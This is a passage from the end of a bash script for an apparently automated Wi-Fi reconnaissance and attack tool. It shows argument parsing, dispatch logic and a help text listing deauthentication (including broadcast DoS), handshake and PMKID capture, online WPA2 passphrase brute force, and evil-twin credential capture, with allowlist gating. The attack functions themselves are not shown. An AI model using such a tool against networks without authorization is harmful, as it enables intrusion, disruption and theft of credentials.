		print_log OK RECON "Report ${out##*/}"
		return 0
		;;
	2)
		print_log OK RECON "No new networks — report skipped"
		return 0
		;;
	*)
		print_log WARN RECON "No report"
		return 1
		;;
	esac
}

function main() {
	local baseline_action="" baseline_path="" baseline_left="" baseline_right="" from_sar="" recon_mode=0 gps_test=0

	while (($# > 0)); do
		case "$1" in
		--trace-rules)
			ENABLE_TRACE_RULES=1
			shift
			;;
		--baseline-save)
			baseline_action="save"
			shift
			if [[ -n "${1:-}" && "${1}" != -* ]]; then
				baseline_path="$1"
				shift
			fi
			;;
		--baseline-compare)
			baseline_action="compare"
			shift
			baseline_left="${1:-}"
			baseline_right="${2:-}"
			shift 2 || true
			;;
		--from-sar)
			shift
			from_sar="${1:-}"
			[[ -n "$from_sar" ]] || {
				print_log ERROR BASELINE "--from-sar needs a path"
				exit 2
			}
			shift
			;;
		--recon)
			recon_mode=1
			shift
			;;
		--recon-secs)
			shift
			RECON_SECS="${1:-}"
			[[ "$RECON_SECS" =~ ^[0-9]+$ ]] || {
				print_log ERROR RECON "--recon-secs needs a number"
				exit 2
			}
			shift
			;;
		--recon-gps)
			RECON_GPS=1
			shift
			;;
		--gps-test)
			gps_test=1
			shift
			;;
		--no-recon)
			RECON_ON_START=0
			shift
			;;
		--no-install)
			AUTO_INSTALL=0
			shift
			;;
		-h | --help)
			printf '%s v%s\n' "$TOOL_NAME" "$VERSION"
			printf 'Usage: %s [options]\n' "$TOOL_NAME"
			printf '  --trace-rules                      Diagnostic Rule Engine trace\n'
			printf '  --baseline-save [path]             Save baseline from SAR/Rule Results\n'
			printf '  --baseline-compare <a.bl> <b.bl>   Compare two baselines\n'
			printf '  --from-sar <sar.jsonl>             SAR input for --baseline-save\n'
			printf '  (no flags)                         Default one-click: auto-install deps, recon survey once, then scan loop\n'
			printf '  --recon                            Passive recon survey only (airodump-ng), writes report_recon_*.html, then exit\n'
			printf '  --recon-secs <n>                   Recon capture seconds (5..3600, default 60)\n'
			printf '  --recon-gps                        Enable gpsd/GPS tagging during recon (needs gpsd)\n'
			printf '  --no-recon                         Skip the startup recon survey (scan loop only)\n'
			printf '  --no-install                       Skip auto-install of missing tools (AUTO_INSTALL=0)\n'
			printf '  --gps-test                         Diagnose the Android->Kali GPS bridge (termux-location/gpsd), print one fix, then exit\n'
			printf '  ENABLE_REPORT_DEDUP=1              Report each network once: recon + vuln reports skip already-reported BSSIDs; no empty reports (set 0 to disable)\n'
			printf 'Env: IFACE, ENABLE_DRY_RUN, LOG_DIR, ENABLE_TRACE_RULES=1, ENABLE_VALIDATION=yes, ENABLE_VALIDATION_TRACE=yes, ENABLE_LOCATION=yes, ENABLE_SURVEY=yes, ENABLE_ASSESSMENT_RESULT=yes,\n'
			printf '     ACTIVE_BSSID_ALLOWLIST / ACTIVE_ALLOWLIST_FILE,\n'
			printf '     ENABLE_LOCKED_SAR_STUB=1, ENABLE_VALIDATION_REVALIDATE=0\n'
			printf '  DISABLE_DIAG_MONITOR_TEST=1        Skip monitor switch test in run_diag\n'
			printf '  RSSI_ATTACK_MIN=-75              Skip attacks on APs weaker than -75 dBm\n'
			printf '  SCAN_TIMEOUT=25                  Per-scan timeout in seconds (applies to iw scan)\n'
			printf '  ENABLE_MOBILE_REEVAL=1            Enable mobile BSSID re-evaluation (default 0)\n'
			printf '  REEVAL_RSSI_IMPROVE_DB=6          RSSI improvement threshold in dB (3..20, default 6)\n'
			printf '  REEVAL_TTL_SEC=300                TTL for re-evaluation in seconds (60..3600, default 300)\n'
			printf '  ENABLE_PMKID=1                     Enable PMKID passive capture (default 1)\n'
			printf '  PMKID_TIMEOUT=10                   PMKID capture timeout in seconds (default 10)\n'
			printf '  ENABLE_EAPOL_PASSIVE=1             Enable passive EAPOL collection (default 1)\n'
			printf '  EAPOL_PASSIVE_TIMEOUT=30           EAPOL passive capture timeout in seconds (default 30)\n'
			printf '  ENABLE_PMKID_ACTIVE=0              Active PMKID solicitation, PMF-resilient (default 0, active; needs ACTIVE allowlist)\n'
			printf '  PMKID_ACTIVE_TIMEOUT=15            Active PMKID capture timeout in seconds (5..120, default 15)\n'
			printf '  ENABLE_DEAUTH=0                    Deauth-assisted handshake capture (default 0, FAIL-CLOSED; needs ACTIVE allowlist)\n'
			printf '  ENABLE_DEAUTH_BROADCAST=0          Broadcast deauth when no client found — DoS-class (default 0)\n'
			printf '  DEAUTH_BURST=5                     Deauth frames per targeted client (1..30, default 5)\n'
			printf '  DEAUTH_MAX_CLIENTS=3               Max associated clients to target (1..10, default 3)\n'
			printf '  DEAUTH_CAPTURE_SECS=20             Handshake capture window seconds (8..90, default 20)\n'
			printf '  DEAUTH_CLIENT_SCAN_SECS=6          Station-discovery window seconds (3..30, default 6)\n'
                  printf '  ENABLE_WPA_BRUTE=1                 Online WPA2-PSK dict brute, scoped+bounded (default 1)\n'
			printf '  WPA_BRUTE_MAX=30                   Max passphrases per AP (default 30)\n'
			printf '  WPA_BRUTE_TRY_SECS=8               Seconds per association attempt (3..60, default 8)\n'
			printf '  WPA_BRUTE_WORDLIST=path            Passphrase file (else small built-in list)\n'
			printf '  ENABLE_SAE_PROBE=0                 Enable SAE group probe (default 0, active)\n'
			printf '  ENABLE_EVILTWIN=0                  WPA-Enterprise (802.1X) evil-twin cred capture (default 0, FAIL-CLOSED)\n'
			printf '     Requires: ACTIVE allowlist present (BSSID) + EVILTWIN_ESSID_ALLOWLIST / _FILE (ESSID); enterprise AKM only\n'
			printf '  EVILTWIN_TOOL=                     Force eaphammer|hostapd-wpe (default: auto-detect)\n'
			printf '  EVILTWIN_TIMEOUT=120               Rogue-AP runtime seconds (20..1800, default 120)\n'
			printf '  EVILTWIN_ESSID_ALLOWLIST="Corp,Guest"   CSV of ESSIDs permitted for evil-twin (use _FILE for ESSIDs with commas)\n'
			printf '     eaphammer needs a one-time cert: run "eaphammer --cert-wizard" before first use\n'
			printf '     ENABLE_VENDOR_KB=0, VENDOR_DIR=./vendor, ...\n'
			exit 0
			;;
		*)
			print_log WARN INIT "Ignoring unknown argument: $1"
			shift
			;;
		esac
	done

	case "$baseline_action" in
	save)
		baseline_cli_save "$baseline_path" "$from_sar"
		exit $?
		;;
	compare)
		baseline_cli_compare "$baseline_left" "$baseline_right"
		exit $?
		;;
	esac

	if [[ "${gps_test:-0}" == "1" ]]; then
		if location_fix; then exit 0; else exit 1; fi
	fi

	if [[ "${AUTO_INSTALL:-1}" == "1" ]]; then
		auto_install_deps || true
	fi

	run_precheck

	if [[ "${recon_mode:-0}" == "1" ]]; then
		if run_recon; then exit 0; else exit 1; fi
	fi

	if [[ "${RECON_ON_START:-1}" == "1" ]]; then
		run_recon || print_log WARN RECON "Recon skipped"
	fi

	run_scan_loop
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
	main "$@"
fi
